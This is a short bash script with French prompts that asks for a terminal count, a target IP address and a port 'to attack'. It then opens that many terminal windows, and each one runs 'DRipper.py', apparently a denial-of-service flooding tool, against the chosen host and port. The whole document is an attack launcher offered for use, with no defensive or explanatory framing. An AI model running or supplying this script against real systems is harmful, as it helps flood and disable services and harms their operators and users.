#!/bin/bash

echo "Entrez le nombre de terminal voulu "
read term 

echo "Entrez l adresse ip voulu "
read ip 

echo "Entrez le port que vous voulez attaquer "
read port

echo "Nombre de term : $term"
nombre_term_actuelle=0

while ((nombre_term_actuelle!=term))
do
	gnome-terminal -e "python3 DRipper.py -s $ip -p $port -t 230" 
	((nombre_term_actuelle++))
done
